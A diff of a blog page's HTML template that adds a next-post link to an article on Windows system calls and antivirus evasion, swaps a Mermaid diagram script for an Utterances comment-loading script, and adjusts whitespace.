+                    <a href="/2022/01/Windows-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8E%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/" rel="next">Windows 系统调用分析与免杀实现 &gt;</a>
+                </li>
+            
+        </ul>
+    
 
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+
+        
+            <div id="utterances"></div>
+        
 
         
     
@@ -256,7 +640,6 @@
     </div>
 </main>
 
-    
 
             
     <div id="back-to-top" class="back-to-top">
@@ -299,20 +682,39 @@
 
 
 
-    <script src="https://cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js"></script>
-<script>
-    let mermaidConfig = {
-        startOnLoad: true,
-        flowchart: {
-            useMaxWidth: false,
-            htmlLabels: true
-        },
-        theme: 'dark'
-    };
-    mermaid.initialize(mermaidConfig);
+
+
+    
+
+        
+
+        
+
+        
+            <script>
+    function loadComments() {
+        (function() {
+            var utterances = document.getElementById("utterances");
+            var script = document.createElement('script');
+            script.src = 'https://utteranc.es/client.js';
+            script.async = true;
+            script.crossOrigin = 'anonymous';
+            script.setAttribute('repo', 'myzxcg\/myzxcg.github.io');
+            script.setAttribute('issue-term', 'title');
+            const isDark = getCurrentTheme() === 'dark';
+        if (isDark) {
+            script.setAttribute('theme', 'photon-dark');
+        } else {
+            script.setAttribute('theme', 'github-light');
+        }
+            
+            utterances.appendChild(script);
+        })();
+    }
 </script>
+        
 
-
+        
 
     
 
